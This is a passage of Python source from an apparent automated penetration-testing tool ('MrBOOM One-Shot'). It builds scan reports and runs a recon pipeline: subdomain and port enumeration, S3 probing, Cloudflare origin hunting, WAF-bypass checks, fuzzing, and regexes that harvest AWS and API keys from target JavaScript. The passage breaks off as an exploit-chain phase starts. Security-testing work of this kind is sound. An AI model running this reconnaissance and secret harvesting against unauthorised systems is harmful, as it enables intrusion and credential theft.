            lines.append(f"- **URL:** `{r.get('url','?')}`")
            lines.append(f"- **WAF detected:** {r.get('waf','Unknown')}")
            lines.append(f"- **Baseline:** HTTP {r.get('status','?')} (server: {r.get('server','?')})")
            if r.get("bypasses"):
                lines.append("- **Bypass probes that differed from baseline:**")
                for b in r["bypasses"]:
                    lines.append(f"  - `{b.get('test','?')}` → HTTP {b.get('status','?')}")
            else:
                lines.append("- **No bypass probe produced a differing response.**")
        lines.append("")

    openapi = data.get("bb_openapi", [])
    if openapi:
        lines.append("## API Specification Discovery (OpenAPI/Swagger/GraphQL)")
        lines.append("")
        for r in openapi:
            if r.get("kind") == "spec_found":
                lines.append(f"- **Spec:** `{r.get('url','?')}` → HTTP {r.get('status','?')} ({r.get('content_type','?')})")
                if r.get("body_preview"):
                    lines.append(f"  - preview: `{r.get('body_preview','')[:120]}`")
            if r.get("kind") == "graphql_endpoint":
                lines.append(f"- **GraphQL endpoint:** `{r.get('url','?')}` → HTTP {r.get('status','?')}")
            if r.get("kind") == "graphql_introspection_open":
                lines.append(f"- **⚠️ GraphQL introspection ENABLED (unauth):** `{r.get('url','?')}`")
            if r.get("kind") == "openapi_paths":
                lines.append(f"**{r.get('count',0)} paths extracted from API specs:**")
                for p in r.get("endpoints", [])[:40]:
                    lines.append(f"- `{p}`")
        lines.append("")

    orig_retest = data.get("bb_origin_retest", [])
    if orig_retest:
        lines.append("## Direct Origin Re-Test (WAF Bypass Validation)")
        lines.append("")
        lines.append("*Confirmed origin IPs were probed directly for sensitive paths and compared against the CDN-wrapped response. Differences reveal content the CDN/WAF is masking.*")
        lines.append("")
        lines.append("| Origin IP | Path | Origin HTTP | CDN HTTP | Differs | Issue | Severity |")
        lines.append("|-----------|------|-------------|----------|---------|-------|----------|")
        for r in orig_retest:
            lines.append(f"| {r.get('origin_ip','?')} | `{r.get('path','?')}` | {r.get('origin_status','?')} ({r.get('origin_len','?')}b) | {r.get('cdn_status','?')} | {'YES' if (r.get('origin_status') or 0) != (r.get('cdn_status') or 0) else 'no'} | {r.get('issue','?')} | {r.get('severity','?')} |")
        lines.append("")

    cf_hunt = data.get("bb_cf_hunt", {})
    if cf_hunt:
        lines.append("## Dedicated CDN Origin Hunt (CloudFront-aware)")
        lines.append("")
        if cf_hunt.get("cloudfront"):
            lines.append(f"- **CloudFront confirmed:** POP `{cf_hunt.get('cloudfront_pop') or 'n/a'}` (server: `{cf_hunt.get('cloudfront_server') or 'n/a'}`)")
        lines.append(f"- **Candidate sources:** {json.dumps(cf_hunt.get('sources', {}))}")
        lines.append(f"- **Elapsed:** {cf_hunt.get('elapsed_s', '?')}s")
        confirmed_cf = [o for o in cf_hunt.get("origin_ips", []) if o.get("confirmed")]
        if confirmed_cf:
            lines.append("")
            lines.append("**Confirmed origin IPs (historical DNS / crt.sh / origin-subdomain probing):**")
            lines.append("")
            lines.append("| IP | Host | Evidence |")
            lines.append("|----|------|----------|")
            for o in confirmed_cf:
                lines.append(f"| {o.get('ip','?')} | {o.get('host','?')} | {o.get('evidence','')[:80]} |")
        edges = cf_hunt.get("cdn_edges", [])
        if edges:
            lines.append("")
            lines.append(f"**{len(edges)} CDN edge IPs filtered** (CloudFront/Cloudflare ranges + PTR + headers): `{', '.join(e.get('ip','') for e in edges[:12])}`")
        lines.append("")

    tech = data.get("bb_tech", {})
    if tech:
        lines.append("## Technology Stack")
        lines.append("")
        for url, techs in sorted(tech.items()):
            lines.append(f"- **{url}**: {', '.join(techs)}")
        lines.append("")

    # ── PD Tool Sections ──

    pd_dns = data.get("pd_dnsx", {})
    if pd_dns:
        lines.append("## DNS Records (dnsx)")
        lines.append("")
        for rtype, vals in pd_dns.items():
            if vals:
                lines.append(f"- **{rtype}:** {', '.join(vals[:5])}")
        lines.append("")

    pd_asn = data.get("pd_asnmap", [])
    if pd_asn:
        lines.append("## ASN / Network Ranges")
        lines.append("")
        for r in pd_asn[:10]:
            lines.append(f"- `{r}`")
        lines.append("")

    pd_uncovered = data.get("pd_uncover", [])
    if pd_uncovered:
        lines.append("## Passive Host Discovery (uncover)")
        lines.append("")
        for h in pd_uncovered[:15]:
            lines.append(f"- `{h}`")
        lines.append("")

    pd_urls = data.get("pd_urlfinder", [])
    if pd_urls:
        lines.append("## Discovered URLs (urlfinder)")
        lines.append("")
        for u in pd_urls[:30]:
            lines.append(f"- `{u}`")
        if len(pd_urls) > 30:
            lines.append(f"  *...and {len(pd_urls) - 30} more*")
        lines.append("")

    pd_katana_eps = data.get("pd_katana", [])
    if pd_katana_eps:
        lines.append("## Crawled Endpoints (katana)")
        lines.append("")
        for ep in pd_katana_eps[:30]:
            lines.append(f"- `{ep}`")
        if len(pd_katana_eps) > 30:
            lines.append(f"  *...and {len(pd_katana_eps) - 30} more*")
        lines.append("")

    pd_tls_certs = data.get("pd_tlsx", [])
    if pd_tls_certs:
        lines.append("## TLS Certificate Analysis")
        lines.append("")
        for c in pd_tls_certs[:5]:
            san = c.get("san", [])
            cn = c.get("cn", "")
            expired = c.get("expired", False)
            lines.append(f"- **CN:** {cn} | **SAN:** {', '.join(san[:5]) if san else 'N/A'} | **Expired:** {str(expired)}")
        lines.append("")

    pd_nuclei_findings = data.get("pd_nuclei", [])
    if pd_nuclei_findings:
        lines.append("## Vulnerability Scan (nuclei)")
        lines.append("")
        lines.append("| Template | Name | Severity | URL |")
        lines.append("|----------|------|----------|-----|")
        for f in pd_nuclei_findings[:20]:
            lines.append(f"| {f.get('template','')} | {f.get('name','')} | {f.get('severity','')} | {f.get('url','')} |")
        if len(pd_nuclei_findings) > 20:
            lines.append(f"*...and {len(pd_nuclei_findings) - 20} more findings*")
        lines.append("")

    pd_vulnx_reports = data.get("pd_vulnx", [])
    if pd_vulnx_reports:
        lines.append("## CVE Lookup (vulnx)")
        lines.append("")
        for svc, report in pd_vulnx_reports.items():
            lines.append(f"### {svc}")
            lines.append("")
            lines.append(f"```\n{report[:300]}\n```")
        lines.append("")

    lines.append("---")
    lines.append(f"*Report generated by MrBOOM One-Shot | {ts}*")

    return "\n".join(lines)

# ─── REPORT EXPORT (HTML / PDF) ─────────────────────────────────

def report_to_html(md_text, title="MrBOOM Report"):
    """Render markdown report + CVSS exec summary into a self-contained HTML doc."""
    html_body = md(md_text, extensions=["tables", "fenced_code", "nl2br"])
    return f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{html_mod.escape(title)}</title>
<style>
body{{font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;line-height:1.55;color:#1f2933;margin:0;padding:32px 20px;background:#f5f7fa;}}
.wrap{{max-width:960px;margin:0 auto;background:#fff;border:1px solid #e2e8f0;border-radius:10px;padding:40px 48px;box-shadow:0 1px 4px rgba(0,0,0,.06);}}
h1{{border-bottom:3px solid #2563eb;padding-bottom:8px;font-size:26px;}}
h2{{margin-top:28px;color:#0f172a;border-bottom:1px solid #e2e8f0;padding-bottom:4px;font-size:20px;}}
h3{{margin-top:20px;font-size:16px;}}
table{{border-collapse:collapse;width:100%;margin:12px 0;font-size:13px;}}
th,td{{border:1px solid #e2e8f0;padding:6px 10px;text-align:left;}}
th{{background:#eef2ff;color:#3730a3;font-weight:600;}}
tr:nth-child(even){{background:#f8fafc;}}
code{{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12px;background:#f1f5f9;padding:2px 5px;border-radius:4px;}}
pre{{background:#0f172a;color:#e2e8f0;padding:14px;border-radius:8px;overflow-x:auto;}}
pre code{{background:none;color:inherit;}}
a{{color:#2563eb;}}
ul,ol{{padding-left:22px;}}
.footer{{margin-top:36px;padding-top:12px;border-top:1px solid #e2e8f0;color:#64748b;font-size:12px;}}
</style></head><body><div class="wrap">
{html_body}
<div class="footer">Generated by MrBOOM One-Shot · {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}</div>
</div></body></html>"""

def _find_font(styles=("", "B")):
    """Locate a regular + bold TTF pair from common font locations."""
    candidates = [
        ("/usr/share/fonts/noto/NotoSans%s.ttf", "/usr/share/fonts/noto/NotoSans%s.ttf"),
        ("/usr/share/fonts/TTF/DejaVuSans%s.ttf", "/usr/share/fonts/TTF/DejaVuSans%s.ttf"),
        ("/usr/share/fonts/dejavu/DejaVuSans%s.ttf", "/usr/share/fonts/dejavu/DejaVuSans%s.ttf"),
        ("/usr/share/fonts/truetype/dejavu/DejaVuSans%s.ttf", "/usr/share/fonts/truetype/dejavu/DejaVuSans%s.ttf"),
    ]
    for reg, bold in candidates:
        for suf in ("", "-Regular"):
            rp = reg % suf
            bp = bold % ("-Bold" if suf == "-Regular" else "B")
            if os.path.exists(rp) and os.path.exists(bp):
                return rp, bp
    return None, None

def report_to_pdf(md_text, title="MrBOOM Report", out_path=None):
    """Render the markdown report to a PDF using fpdf2 (pure-python, no system deps)."""
    try:
        from fpdf import FPDF
    except Exception:
        raise RuntimeError("fpdf2 not installed")
    pdf = FPDF()
    pdf.set_auto_page_break(auto=True, margin=16)
    reg, bold = _find_font()
    if reg and bold:
        pdf.add_font("MrReg", "", reg, uni=True)
        pdf.add_font("MrBold", "", bold, uni=True)
    else:
        pdf.add_font("MrReg", "", "helvetica")
        pdf.add_font("MrBold", "", "helvetica", "B")
    def _set(style):
        pdf.set_font("MrBold" if style == "B" else "MrReg", "", 8 if style == "T" else (15 if style == "H2" else (12 if style == "H3" else (20 if style == "H1" else 9))))
    pdf.add_page()
    lines = md_text.splitlines()
    for raw in lines:
        line = raw.rstrip()
        if not line:
            pdf.ln(2)
            continue
        # tables
        if line.startswith("|") and "|" in line[1:]:
            cells = [c.strip() for c in line.strip("|").split("|")]
            col_w = 180 / max(len(cells), 1)
            _set("B")
            for c in cells:
                pdf.cell(col_w, 5, c[:40], border=1)
            pdf.ln()
            continue
        # split any token longer than ~70 chars so fpdf can wrap it
        line = re.sub(r"(?<=\S)(\S{80,})", lambda m: m.group(1)[:80] + "\u200b" + m.group(1)[80:], line)
        if line.startswith("## "):
            _set("H2")
            pdf.multi_cell(pdf.epw, 7, line[3:])
            pdf.ln(2)
        elif line.startswith("### "):
            _set("H3")
            pdf.multi_cell(pdf.epw, 6, line[4:])
            pdf.ln(1)
        elif line.startswith("- "):
            _set("P")
            pdf.multi_cell(pdf.epw, 5, "\u2022 " + line[2:])
        elif line.startswith("# "):
            _set("H1")
            pdf.multi_cell(pdf.epw, 9, line[2:])
            pdf.ln(3)
        else:
            _set("P")
            pdf.multi_cell(pdf.epw, 5, line)
    if out_path:
        pdf.output(out_path)
        return out_path
    return pdf

# ─── THE PIPELINE ────────────────────────────────────────────────

def run_oneshot(eid):
    """Run the full one-shot pipeline in a background thread."""
    eng = DB[eid]
    domain = clean_host(eng["scope"])
    apex = apex_domain(domain)
    base_url = eng.get("base_url", "")
    model = eng.get("model", "")
    api_key = eng.get("api_key", "")
    prompt = eng.get("prompt", "")

    task_id = eid
    pair_id = {"harness": "mrboom", "model": model or "auto"}

    def emit_ir(etype: str, payload: dict):
        ev = {
            "type": etype,
            "ts": datetime.now(timezone.utc).isoformat(),
            "source": {"pair": pair_id},
            "payload": payload,
            "task_id": task_id,
        }
        eng["events"].append(ev)
        eng["events"] = eng["events"][-200:]
        emit_sync("ir", ev)

    def log_state(msg):
        eng["logs"].append({"t": now(), "msg": msg})
        eng["progress"] = msg

    def meta_up(**kw):
        meta_state.update({"task_id": task_id, "goal": prompt or domain, **kw})
        emit_sync("meta", dict(meta_state))

    meta_up(status="running")
    data = {"domain": domain, "model": model}

    # Load cross-scan memory for this target so recon/probes benefit from prior scans.
    data["scan_memory"] = _load_scan_memory(domain)
    mem = data["scan_memory"]
    if any(mem.values()):
        mem_hits = len(mem.get("findings", [])) + len(mem.get("api_endpoints", [])) + len(mem.get("probes", [])) + len(mem.get("validations", []))
        log_state(f"Scan memory: {mem_hits} prior discoveries loaded for {domain}.")
        emit_ir("message", {"role": "assistant", "text": f"Loaded **scan memory** for **{domain}**: {mem_hits} prior discoveries (API endpoints, validations, probed paths, confirmed vulnerabilities) will guide this run."})

    try:
        # Phase 1: DNS
        log_state("DNS reconnaissance...")
        emit_ir("routing.decided", {
            "chosen": pair_id,
            "predicted_success": 0.85,
            "why": f"Starting DNS recon on {domain}",
            "basis": "init",
            "features": {"predicted_success": 0.85, "predicted_cost_usd": 0.02},
            "alternatives": []
        })
        emit_ir("message", {"role": "assistant", "text": f"Starting reconnaissance against **{domain}**. Phase 1: DNS enumeration."})

        dns = {}
        for rtype in ["A", "MX", "NS"]:
            try:
                addrs = socket.getaddrinfo(domain, 80, socket.AF_INET, socket.SOCK_STREAM)
                dns[rtype] = list(set(a[4][0] for a in addrs[:3]))
            except:
                dns[rtype] = []
        data["dns"] = dns
        log_state(f"DNS: {dns.get('A', ['unknown'])}")
        emit_ir("verification", {"kind": "dns", "command": f"DNS lookup {domain}", "passed": len(dns.get("A", [])) > 0})
        emit_ir("usage", {"interval": "cumulative", "usage": {"cost_usd": 0.01}})

        # Phase 2: Subdomains
        log_state("Discovering subdomains (PD subfinder + assetfinder)...")
        emit_ir("message", {"role": "assistant_thinking", "text": f"Running ProjectDiscovery subfinder, assetfinder and crt.sh for subdomain enumeration..."})
        pd_subs = pd_subfinder(apex)
        if pd_subs is not None and len(pd_subs) > 3:
            subs = pd_subs
            emit_ir("message", {"role": "assistant", "text": f"subfinder discovered **{len(subs)}** subdomains."})
        else:
            emit_ir("message", {"role": "assistant_thinking", "text": f"Falling back to crt.sh + wordlist enumeration..."})
            subs = discover_subdomains(apex)
        # assetfinder supplement (passive, additive)
        af_subs = pd_assetfinder(apex)
        if af_subs:
            before = len(subs)
            subs = sorted(set(subs + af_subs))
            if len(subs) > before:
                emit_ir("message", {"role": "assistant", "text": f"assetfinder added **{len(subs) - before}** more subdomains (total {len(subs)})."})
        subs = sorted(set(subs + [apex]))
        if domain != apex and domain not in subs:
            subs.insert(0, domain)
        data["subdomains"] = subs[:50]
        log_state(f"Subdomains: {len(subs)} found, probing top 25")
        emit_ir("tool.call", {"call_id": f"sub-{eid}", "name": "subfinder + crt.sh", "target": domain, "category": "search"})
        time.sleep(0.3)
        emit_ir("tool.result", {"call_id": f"sub-{eid}", "status": "ok", "result": f"{len(subs)} subdomains"})
        emit_ir("health.assessment", {"score": 0.7, "signals": ["subdomain_discovery"]})

        # Phase 3: PD DNS / ASN / Uncover
        log_state("Enumerating DNS records and ASN (PD)...")
        emit_ir("message", {"role": "assistant_thinking", "text": f"Running PD dnsx, asnmap, and uncover for deeper discovery..."})
        pd_dns_records = pd_dnsx(apex)
        if pd_dns_records: data["pd_dnsx"] = pd_dns_records
        pd_asn_ranges = pd_asnmap(apex)
        if pd_asn_ranges: data["pd_asnmap"] = pd_asn_ranges
        pd_uncovered_hosts = pd_uncover(apex)
        if pd_uncovered_hosts: data["pd_uncover"] = pd_uncovered_hosts
        log_state(f"DNS records: {sum(len(v) for v in (pd_dns_records or {}).values())} | ASN ranges: {len(pd_asn_ranges or [])} | uncover hosts: {len(pd_uncovered_hosts or [])}")
        emit_ir("health.assessment", {"score": 0.75, "signals": ["pd_dns_asn"]})

        # Phase 4: HTTP Probe
        log_state("Probing HTTP services...")
        emit_ir("message", {"role": "assistant", "text": f"Discovered **{len(subs)} subdomains**. Now probing for live HTTP services."})
        emit_ir("tool.call", {"call_id": f"http-{eid}", "name": "HTTP probe", "target": domain, "category": "read"})
        http_results = probe_http(subs[:50], domain)
        # Optionally try httpx for additional detail
        pd_http = pd_httpx(subs[:30])
        if pd_http:
            for url, info in pd_http.items():
                if url in http_results:
                    http_results[url].update(info)
                else:
                    http_results[url] = info
        data["http"] = http_results
        log_state(f"HTTP: {len(http_results)} live services")
        emit_ir("tool.result", {"call_id": f"http-{eid}", "status": "ok", "result": f"{len(http_results)} live"})
        emit_ir("edit", {"path": f"{domain}/http", "lines_added": len(http_results), "lines_removed": 0})

        # Phase 4: CSP Analysis
        log_state("Analyzing CSP headers...")
        csp_data = analyze_csp(http_results)
        data["csp"] = csp_data
        log_state(f"CSP: {len(csp_data.get('s3_buckets', []))} S3 buckets found")
        if csp_data.get("s3_buckets"):
            emit_ir("message", {"role": "assistant", "text": f"CSP headers leaked **{len(csp_data['s3_buckets'])} S3 bucket names** — potential data exposure."})
        emit_ir("health.assessment", {"score": 0.5 if csp_data.get("s3_buckets") else 0.8, "signals": ["csp_analysis"]})

        # Phase 5: S3 Probe
        if csp_data.get("s3_buckets"):
            log_state("Probing S3 buckets...")
            emit_ir("tool.call", {"call_id": f"s3-{eid}", "name": "S3 bucket probe", "target": "s3.amazonaws.com", "category": "read"})
            s3_results = probe_s3(csp_data["s3_buckets"])
            data["s3"] = s3_results
            public_count = sum(1 for v in s3_results.values() if v.get("public"))
            emit_ir("tool.result", {"call_id": f"s3-{eid}", "status": "ok", "result": f"{public_count} public"})
            if public_count:
                emit_ir("message", {"role": "assistant", "text": f"**WARNING**: {public_count} S3 buckets are publicly listable!"})

        # Phase 6: JS Analysis
        log_state("Analyzing JavaScript bundles...")
        emit_ir("message", {"role": "assistant_thinking", "text": "Scanning JavaScript bundles for API endpoints, secrets, and AWS keys..."})
        emit_ir("tool.call", {"call_id": f"js-{eid}", "name": "JS bundle analysis", "target": domain, "category": "read"})
        api_eps = set()
        secrets = []
        for url, info in http_results.items():
            if info.get("status") != 200: continue
            _, _, body = http_get(url, timeout=10)
            if not body: continue
            js_files = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', body)
            for js_path in js_files[:5]:
                if js_path.startswith("http"):
                    js_url = js_path
                elif js_path.startswith("//"):
                    js_url = "https:" + js_path
                elif js_path.startswith("/"):
                    parsed = urllib.parse.urlparse(url)
                    js_url = f"{parsed.scheme}://{parsed.netloc}{js_path}"
                else:
                    continue

                js_status, _, js_body = http_get(js_url, timeout=10)
                if js_status != 200 or not js_body: continue

                eps = re.findall(r'["\'](/api/[^"\']+)["\']', js_body)
                for ep in eps: api_eps.add(ep)

                for m in re.finditer(r'["\']([A-Za-z0-9_\-]{40,})["\']', js_body):
                    val = m.group(1)
                    if not any(k in val.lower() for k in ["react","memoized","children","context","function","prototype","render","component","aaaaaaaa"]):
                        secrets.append(val)

                aws = re.findall(r'AKIA[0-9A-Z]{16}', js_body)
                for k in aws: secrets.append(f"AWS_KEY: {k}")
                sk = re.findall(r'sk-[a-zA-Z0-9]{20,}', js_body)
                for k in sk: secrets.append(f"API_KEY: {k}")

        data["api_endpoints"] = sorted(api_eps)
        data["secrets"] = secrets[:20]
        log_state(f"JS: {len(api_eps)} API endpoints, {len(secrets)} potential secrets")
        emit_ir("tool.result", {"call_id": f"js-{eid}", "status": "ok", "result": f"{len(api_eps)} endpoints, {len(secrets)} secrets"})
        if api_eps:
            emit_ir("message", {"role": "assistant", "text": f"Extracted **{len(api_eps)} API endpoints** and **{len(secrets)} potential secrets** from JavaScript bundles."})

        # Phase 6b: Client-Side Web Assessment
        log_state("Assessing client-side security (cookies/CSP/DOM-XSS)...")
        emit_ir("tool.call", {"call_id": f"cs-{eid}", "name": "clientside assessment", "target": domain, "category": "read"})
        from clientside import scan_clientside
        try:
            cs_findings = scan_clientside(list(http_results.keys())[:10])
        except Exception as e:
            cs_findings = []
            emit_ir("error", {"scope": "clientside", "class": type(e).__name__, "message": str(e)[:120]})
        for f in cs_findings:
            f["exploitable"] = bool(f.get("exploitable"))
        data["clientside_findings"] = cs_findings
        log_state(f"clientside: {len(cs_findings)} findings")
        emit_ir("tool.result", {"call_id": f"cs-{eid}", "status": "ok" if cs_findings else "empty", "result": f"{len(cs_findings)} client-side findings"})
        if cs_findings:
            cs_med = sum(1 for f in cs_findings if f["severity"] in ("CRITICAL", "HIGH", "MEDIUM"))
            emit_ir("message", {"role": "assistant", "text": f"Client-side assessment found **{len(cs_findings)}** issues ({cs_med} medium+): cookies/CSP/DOM-XSS."})

        # Phase 7: PD URL Finder
        log_state("Collecting passive URLs (PD urlfinder)...")
        emit_ir("tool.call", {"call_id": f"urlf-{eid}", "name": "urlfinder", "target": domain, "category": "search"})
        pd_urls = pd_urlfinder(domain)
        if pd_urls:
            data["pd_urlfinder"] = pd_urls
            emit_ir("message", {"role": "assistant", "text": f"urlfinder harvested **{len(pd_urls)}** URLs from passive sources."})
        emit_ir("tool.result", {"call_id": f"urlf-{eid}", "status": "ok" if pd_urls else "empty", "result": f"{len(pd_urls or [])} URLs"})

        # Phase 8: Port Scan
        log_state("Scanning ports (PD naabu)...")
        emit_ir("tool.call", {"call_id": f"port-{eid}", "name": "TCP port scan", "target": domain, "category": "read"})
        pd_ports = pd_naabu(domain)
        if pd_ports is not None and any(pd_ports.values()):
            ports = pd_ports
            emit_ir("message", {"role": "assistant", "text": f"naabu found **{sum(len(v) for v in pd_ports.values())}** open ports across **{len(pd_ports)}** IPs."})
        else:
            ports = port_scan(domain, subs[:20])
        data["ports"] = ports
        log_state(f"Ports: {sum(len(v) for v in ports.values())} open across {len(ports)} IPs")
        emit_ir("tool.result", {"call_id": f"port-{eid}", "status": "ok", "result": f"{sum(len(v) for v in ports.values())} open"})
        emit_ir("health.assessment", {"score": 0.5 if ports else 0.9, "signals": ["port_scan"]})

        # Phase 8c: Probe discovered web ports (HTTP/HTTPS) and fold into web targets.
        # probe_http only checks 80/443 on the domain, so a service on e.g. 8443 would
        # otherwise never be treated as a web target (dirbust/API/injection never reach it).
        web_port_hits = 0
        for ip, plist in ports.items():
            for p in plist:
                if p not in (80, 443, 8000, 8080, 8081, 8082, 8443, 8888, 3000, 5000, 9000):
                    continue
                host_for_port = ip if ip else domain
                for proto in ("https://", "http://"):
                    url = f"{proto}{host_for_port}:{p}/"
                    if url in http_results:
                        break
                    status, headers, body = http_get(url, timeout=5)
                    if status > 0:
                        server = headers.get("Server", headers.get("server", ""))
                        title = ""
                        m = re.search(r"<title>([^<]+)</title>", body, re.IGNORECASE)
                        if m: title = m.group(1).strip()[:80]
                        csp = headers.get("Content-Security-Policy", headers.get("content-security-policy", ""))
                        http_results[url] = {
                            "status": status, "server": server, "title": title,
                            "tech": detect_tech(status, headers, body), "csp": csp[:200],
                            "cloudflare": False, "aws": False, "web_port": True,
                        }
                        web_port_hits += 1
                        log_state(f"web port {p} -> {url} ({status})")
                        break
        if web_port_hits:
            emit_ir("tool.result", {"call_id": f"wport-{eid}", "status": "ok", "result": f"{web_port_hits} web ports responding"})
            emit_ir("message", {"role": "assistant", "text": f"Discovered **{web_port_hits}** additional HTTP services on non-standard web ports."})

        # Phase 8b: TLS Certificate Analysis (pd_tlsx)
        tls_targets = [f"https://{domain}"]
        for s in list(subs)[:5]:
            tls_targets.append(f"https://{s}")
        log_state("Analyzing TLS certificates (PD tlsx)...")
        emit_ir("tool.call", {"call_id": f"tls-{eid}", "name": "tlsx", "target": domain, "category": "read"})
        pd_tls_certs = pd_tlsx(tls_targets)
        if pd_tls_certs:
            data["pd_tlsx"] = pd_tls_certs
            expired = sum(1 for c in pd_tls_certs if c.get("expired"))
            emit_ir("message", {"role": "assistant", "text": f"tlsx analyzed **{len(pd_tls_certs)}** certs — **{expired}** expired."})
        emit_ir("tool.result", {"call_id": f"tls-{eid}", "status": "ok" if pd_tls_certs else "empty", "result": f"{len(pd_tls_certs or [])} certs analyzed"})

        # Phase 8: WHOIS / Domain Intelligence
        log_state("Gathering domain intelligence...")
        emit_ir("tool.call", {"call_id": f"whois-{eid}", "name": "WHOIS lookup", "target": domain, "category": "search"})
        whois_data = {"registrar": "", "org": "", "country": "", "emails": [], "nameservers": []}
        try:
            r = subprocess.run(["whois", domain], capture_output=True, text=True, timeout=15)
            if r.returncode == 0:
                for line in r.stdout.splitlines():
                    ll = line.lower()
                    if "registrar:" in ll: whois_data["registrar"] = line.split(":", 1)[1].strip()
                    if "org-name:" in ll or "orgname:" in ll or "organization:" in ll: whois_data["org"] = line.split(":", 1)[1].strip()
                    if "country:" in ll: whois_data["country"] = line.split(":", 1)[1].strip()
                    if "e-mail:" in ll or "email:" in ll: whois_data["emails"].append(line.split(":", 1)[1].strip())
                    if "nserver:" in ll or "name server:" in ll: whois_data["nameservers"].append(line.split(":", 1)[1].strip())
        except: pass
        data["whois"] = whois_data
        log_state(f"WHOIS: {whois_data.get('org','?')} ({whois_data.get('country','?')})")
        emit_ir("tool.result", {"call_id": f"whois-{eid}", "status": "ok" if whois_data.get("org") else "limited", "result": f"{whois_data.get('org','unknown org')} in {whois_data.get('country','?')}"})
        emit_ir("health.assessment", {"score": 0.6, "signals": ["domain_intel"]})

        # Phase 9: WAF / Security Headers Analysis
        log_state("Analyzing security posture...")
        emit_ir("tool.call", {"call_id": f"sec-{eid}", "name": "WAF + security headers", "target": domain, "category": "read"})
        waf_detected = set()
        sec_headers_missing = []
        for url, info in http_results.items():
            srv = info.get("server", "").lower()
            if "cloudflare" in srv: waf_detected.add("Cloudflare")
            if "akamai" in srv: waf_detected.add("Akamai")
            if "incapsula" in srv: waf_detected.add("Incapsula")
            if "cloudfront" in srv: waf_detected.add("CloudFront")
            if "fastly" in srv: waf_detected.add("Fastly")
            if "sucuri" in srv: waf_detected.add("Sucuri")
            # Check response for WAF fingerprints
            try:
                sec_url = url.rstrip("/")
                _, sec_headers, sec_body = http_get(sec_url, timeout=5)
                for h in ["X-Content-Type-Options", "X-Frame-Options", "Content-Security-Policy", "Strict-Transport-Security", "X-XSS-Protection"]:
                    if h.lower() not in {k.lower() for k in sec_headers}:
                        sec_headers_missing.append(h)
            except: pass
            break
        data["waf"] = list(waf_detected)
        data["missing_security_headers"] = sec_headers_missing[:10]
        waf_str = ", ".join(waf_detected) if waf_detected else "none detected"
        log_state(f"WAF: {waf_str} | {len(sec_headers_missing)} security headers missing")
        emit_ir("tool.result", {"call_id": f"sec-{eid}", "status": "ok", "result": f"WAF: {waf_str}, missing headers: {len(sec_headers_missing)}"})
        if sec_headers_missing:
            emit_ir("message", {"role": "assistant", "text": f"**Security Headers Audit:** Missing {len(sec_headers_missing)} key headers: {', '.join(sec_headers_missing[:5])}."})

        # Phase 10: CF Bypass
        log_state("Hunting origin IPs...")
        emit_ir("tool.call", {"call_id": f"cf-{eid}", "name": "Cloudflare bypass", "target": domain, "category": "search"})
        origins = cf_bypass(domain)
        data["origins"] = origins
        log_state(f"Origins: {len(origins)} candidates")
        emit_ir("tool.result", {"call_id": f"cf-{eid}", "status": "ok", "result": f"{len(origins)} origin IPs"})

        # Phase 11: PD Katana Web Crawling
        log_state("Crawling web endpoints (PD katana)...")
        emit_ir("tool.call", {"call_id": f"kat-{eid}", "name": "katana crawler", "target": domain, "category": "search"})
        katana_targets = [u for u in http_results.keys()][:3]
        pd_crawled = []
        for kt in katana_targets:
            eps = pd_katana(kt)
            if eps: pd_crawled.extend(eps)
        if pd_crawled:
            data["pd_katana"] = sorted(set(pd_crawled))
            emit_ir("message", {"role": "assistant", "text": f"katana discovered **{len(data['pd_katana'])}** endpoints across {len(katana_targets)} targets."})
        emit_ir("tool.result", {"call_id": f"kat-{eid}", "status": "ok" if pd_crawled else "empty", "result": f"{len(pd_crawled)} endpoints"})

        # Phase 11b: Content fuzzing (ffuf / gobuster) — if installed + wordlist
        log_state("Content fuzzing (ffuf/gobuster)...")
        emit_ir("tool.call", {"call_id": f"ffuf-{eid}", "name": "Content fuzzing", "target": domain, "category": "search"})
        fuzz_findings = []
        fuzz_targets = [u for u in list(http_results.keys())[:3]]
        for ft in fuzz_targets:
            if len(fuzz_findings) >= 40:
                break
            res = pd_ffuf(ft) or []
            if not res:
                res = pd_gobuster(ft) or []
            for r in res:
                fuzz_findings.append({"url": r.get("url", ""), "status": r.get("status"), "size": r.get("size", r.get("words", ""))})
        if fuzz_findings:
            data["bb_fuzz"] = fuzz_findings
            emit_ir("message", {"role": "assistant", "text": f"ffuf/gobuster fuzzed **{len(fuzz_targets)}** targets and found **{len(fuzz_findings)}** interesting paths."})
        emit_ir("tool.result", {"call_id": f"ffuf-{eid}", "status": "ok" if fuzz_findings else "empty", "result": f"{len(fuzz_findings)} paths"})

        # Phase 12: Exploit Chain (when model + ports available)
        if ports and base_url and model and api_key:
            log_state("Analyzing exploit chains for open ports...")
            emit_ir("message", {"role": "assistant", "text": f"**Open ports detected — mapping exploit chains...**"})
            emit_ir("tool.call", {"call_id": f"exploit-{eid}", "name": "Exploit chain analysis", "target": domain, "category": "search"})
            port_services = {}
            for ip, plist in ports.items():
                for p in plist:
